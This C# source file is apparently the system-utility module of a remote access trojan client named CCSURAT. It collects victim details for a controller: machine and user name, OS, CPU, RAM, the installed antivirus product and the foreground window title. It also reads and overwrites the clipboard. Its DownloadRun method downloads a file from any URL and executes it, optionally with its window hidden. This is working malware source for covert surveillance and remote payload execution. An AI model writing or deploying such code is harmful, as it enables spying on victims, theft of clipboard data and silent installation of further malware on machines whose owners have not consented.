using System;
using Microsoft.Win32;
using System.Management;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Net;

namespace CCSURAT_Client
{
    // this class is used to retrieve/store information on the client PC
    // this will also be where info/basic command functions are written.
    static class SystemUtils
    {
        public static string SystemInfo()
        { 
            string info = "";
            info += Application.ProductVersion + "|*|";
            info += Environment.MachineName + "|*|";
            info += Environment.UserName + "|*|";
            info += GetOS() + "|*|";
            info += GetCPU() + "|*|";
            info += GetRAM() + "|*|";
            info += GetAV() + "|*|";
            info += GetActiveWindow();
            return info;
        }

        // Get OS version from registry, other way would be translating it from Environment class
        public static string GetOS()
        {
            RegistryKey reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            // Detect and append system architecture
            string pa = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            return (string)reg.GetValue("ProductName") + " " + ((String.IsNullOrEmpty(pa) || String.Compare(pa, 0, "x86", 0, 3, true) == 0) ? 32 : 64) + "-bit";
        }

        public static string GetCPU()
        {
            // Can count subkeys to get # of cores.
            RegistryKey reg = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
            return (string)reg.GetValue("ProcessorNameString");
        }

        public static string GetRAM()
        {
            long total = 0;
            // Query WMI
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");
            // Get each stick of installed memory
            foreach (ManagementObject mObj in searcher.Get())
            {
                // Convert to GB from Bytes and add to total
                 total += Convert.ToInt64(mObj["Capacity"]) / 1024 / 1024 / 1024;
            }
            return total.ToString() + " GB";
        }

        // Attempts to grab AV from WMI, test have shown that this may not work properly. Rework.
        public static string GetAV()
        {
            try
            {
                ManagementObjectSearcher searcher = null;
                searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
                foreach (ManagementObject mObj in searcher.Get())
                    return mObj["displayName"].ToString();
            }
            catch(Exception ex)
            {
                return "Not Found";
            }
            return "Not Found";
        }

        // Get current active (window in foreground window
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        public static string GetActiveWindow()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        // Get/Set clipboard data.
        public static string GetClipboard()
        {
            IDataObject iData = Clipboard.GetDataObject();
            return Clipboard.GetData(DataFormats.Text).ToString();
        }
        public static void SetClipboard(string s)
        {
            Clipboard.SetText(s);
        }

        // Downloads and executes file from a URL. File downloads to current client directory.
        public static void DownloadRun(string url, string type)
        {
            try
            {
                WebClient webClient = new WebClient();
                string file = url.Substring(url.LastIndexOf("/") + 1);
                webClient.DownloadFile(url, Environment.CurrentDirectory + "\\" + file);
                Process start = new Process();
                start.StartInfo.FileName = Environment.CurrentDirectory + "\\" + file;
                if (type == "HIDDEN")
                {
                    start.StartInfo.CreateNoWindow = true;
                    start.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                }
                start.Start();
            }
            catch (Exception ex)
            {

            }
        }

        // Gets information about all displays/monitors.
        public static string GetMonitors()
        {
            string monitors = "";
            foreach (var screen in Screen.AllScreens)
            {
                monitors += screen.Primary.ToString() + "|*|";
                monitors += screen.Bounds.X + "|*|";
                monitors += screen.Bounds.Y + "|*|";
                monitors += screen.Bounds.Width + "|*|";
                monitors += screen.Bounds.Height + "|*|";
                monitors += screen.DeviceName + "|&|"; // double asterisk seperates multiple monitors.
            }
            return monitors;
        }
    }
}
